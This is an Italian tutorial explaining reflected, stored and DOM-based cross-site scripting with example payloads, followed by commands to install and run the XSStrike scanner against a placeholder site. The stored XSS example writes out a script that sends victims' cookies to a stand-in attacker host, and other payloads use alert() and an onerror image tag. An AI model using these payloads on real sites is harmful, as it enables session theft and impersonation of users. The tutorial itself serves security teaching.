# Cross-Site Scripting (XSS)

## Indice

- [Descrizione](#descrizione)
- [Teoria](#teoria)
- [Reflected XSS (Non-Persistent XSS)](#reflected-xss)
- [Stored XSS (Persistent XSS)](#stored-xss)
- [Dom-Based XSS](#dom-xss)
- [XSS Strike (Check XSS automaticamente)](#xss-strike)
    - [Requisiti](#requisiti)
    - [Installazione](#installazione)
    - [Scansione con parametri GET](#scansione-get)
    - [Scansione con parametri POST](#scansione-post)



## Descrizione

Il Cross-Site Scripting (XSS) è una tipologia di vulnerabilità presente nelle applicazioni web che permette ad un attaccante di iniettare codice malevolo (di solito JavaScript) all'interno di pagine web visualizzate da altri utenti. Questo attacco sfrutta la fiducia che un utente ripone in un sito web, inducendolo ad eseguire del codice proveniente da una fonte apparentemente legittima.

## Teoria

Per comprendere a fondo le vulnerabilità XSS, è importante analizzare il meccanismo sottostante:

* L'iniezione: L'attaccante invia dati contenenti codice malevolo verso l'applicazione.

* La mancata sanitizzazione: L'applicazione non filtra adeguatamente i dati immessi, accettando input non sicuro.

* L'esecuzione: Il browser dell'utente esegue il codice malevolo incorporato nella risposta HTML, sfruttando la fiducia dell'utente nella fonte del contenuto.

Per proteggersi, le applicazioni devono validare, sanitizzare e codificare correttamente i dati in ingresso e in uscita. Tecniche come la Content Security Policy (CSP) possono aiutare a limitare l'impatto anche nel caso in cui si verifichi un'iniezione.

## Reflected XSS

Il Reflected XSS si verifica quando i dati iniettati dall'attaccante vengono immediatamente "riflessi" da una risposta del server, che li inserisce in pagine web senza la dovuta sanitizzazione. Questo tipo di attacco è solitamente realizzato tramite link appositamente creati, che, se cliccati dalla vittima, provocano l'esecuzione del codice malevolo.

#### Esempio pratico di Reflected XSS

* Immagina un sito web di ricerca con una URL del tipo:  
  
  `https://www.esempio.com/ricerca?query=test`
* Se il parametro "query" non viene correttamente sanitizzato, l'attaccante potrebbe inviare un URL come il seguente:  
  
  `https://www.esempio.com/ricerca?query=<script>alert('XSS')</script>`  
    
* Quando la vittima clicca sul link, il browser riceve la risposta contenente:  
  
  ```html
  <html>
  <head>
    <title>Risultati per
        <script>
            alert('XSS')
        </script>
    </title>
  </head>
  <body>
    <h1>Risultati per
        <script>
            alert('XSS')
        </script>
    </h1>
    <!-- Altri contenuti -->
  </body>
    </html>  
* Il codice <script>alert('XSS')</script> viene eseguito immediatamente sul browser della vittima, mostrando un pop-up con il messaggio "XSS", a dimostrazione del controllo che l'attaccante può ottenere sul contenuto visualizzato.

## Stored XSS

Lo Stored XSS si verifica quando i dati malevoli vengono salvati in modo permanente sul server, ad esempio all'interno di un database, e vengono successivamente presentati a numerosi utenti. Questo tipo di attacco è particolarmente pericoloso poiché l'iniezione non è limitata ad un singolo utente, ma si propaga alla base utenti.

#### Esempio pratico di Stored XSS

* Un utente vulnerabile invia un commento malevolo su un blog:  

  ```html
  <script>
    document.location='https://attacker.com/steal?cookie=' + document.cookie
  </script>
* Il commento viene salvato nel database del blog.
* Ogni volta che un altro utente visita l'articolo contenente il commento, il browser esegue il codice script iniettatogli.
* Ad esempio, la pagina potrebbe contenere:  

    ```html
    <div class="comment">
        <p>Ottimo articolo!</p>
    </div>

    <div class="comment">
        <p>
            <script>
                document.location='https://attacker.com/steal?cookie=' + document.cookie
            </script>
        </p>
    </div>
* Il codice viene eseguito automaticamente e invia i cookie della vittima al server dell’attaccante, permettendo il furto di dati sensibili e l’eventuale impersonificazione dell’utente.

## Dom XSS

Il DOM-Based XSS è una variante in cui l'iniezione e l'esecuzione del codice malevolo avvengono interamente lato client, ossia attraverso la manipolazione del Document Object Model (DOM) nel browser. In questo caso, il server non è direttamente coinvolto nella vulnerabilità, ma il codice JavaScript lato client elabora input non validati provenienti dalla URL o da altre sorgenti (come fragment identifier).

#### Esempio pratico di Dom-Based XSS

* Considera una pagina che legge il fragment identifier (la parte successiva al simbolo “#” nell'URL) e lo visualizza sul sito:  

    ```html
    <!DOCTYPE html>
    <html>
    <head>
    <title>Demo DOM XSS</title>
    </head>
    <body>
    <div id="content"></div>
    <script>
        // Il codice sottostante recupera il fragment identifier dall'URL
        var hash = window.location.hash.substring(1);
        // E lo inserisce nel DOM senza sanitizzazione
        document.getElementById('content').innerHTML = hash;
    </script>
    </body>
    </html>
* Se l'attaccante genera un URL come:  

    `https://www.esempio.com/demo#<img src=x onerror=alert('Dom XSS')>`
* All'apertura della pagina, il browser eseguirà il codice contenuto nel fragment:
    ```html
    <div id="content">
        <img src=x onerror=alert('Dom XSS')>
    </div>
* Questo provoca un errore nel caricamento dell’immagine, attivando l’evento onerror e l’esecuzione del comando JavaScript che mostra il pop-up “Dom XSS” o esegue altre azioni malevole.

## XSS Strike
XSS Strike è uno strumento creato per il penetration testing, finalizzato a sfruttare e analizzare vulnerabilità di tipo Cross-Site Scripting (XSS) in applicazioni web.

#### Requisiti  
- Python 3.4+
- git

#### Installazione
Per installare XSS Strike è sufficiente digitare questi comandi nel terminale
```bash
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip install -r requirements.txt --break-system-packages
```

### Scansione GET
Supponiamo che il sito https://targetsite.com abbia una pagina di ricerca vulnerabile:
- https://targetsite.com/search?query=xxx  

Il comando per testare il parametro “query” sarà:
- `python xssstrike.py --url "https://targetsite.com/search?query=xxx" --verbose`  

L'output mostrerà quali payload sono stati iniettati e se sono stati rilevati script eseguibili dal browser.

### Scansione POST
Considera un form di invio commenti su https://targetsite.com/comment che accetta il parametro “comment”. Per testare:
- `python xssstrike.py --url "https://targetsite.com/comment" --method POST --data "comment=xxx" --verbose`  

Il tool invierà richieste sostituendo “xxx” con payload XSS e verificherà eventuali esecuzioni.
